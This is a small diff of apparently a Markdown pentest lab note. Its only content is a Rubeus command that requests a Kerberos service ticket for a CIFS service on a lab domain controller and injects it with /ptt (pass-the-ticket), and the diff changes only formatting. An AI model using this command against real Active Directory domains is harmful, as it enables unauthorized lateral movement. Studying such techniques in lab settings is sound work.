@@ -39,7 +39,8 @@
 1. **Request service tickets with Rubeus** 
     
     > **Rubeus.exe asktgs   /ticket: ticket Location  /service: service type [cifs/mcorpdc.moneycorp.local]  /dc: domain controller [mcorp-dc.moneycorp.local]  /ptt**
-    > 
+    
+   
     
     # References
     
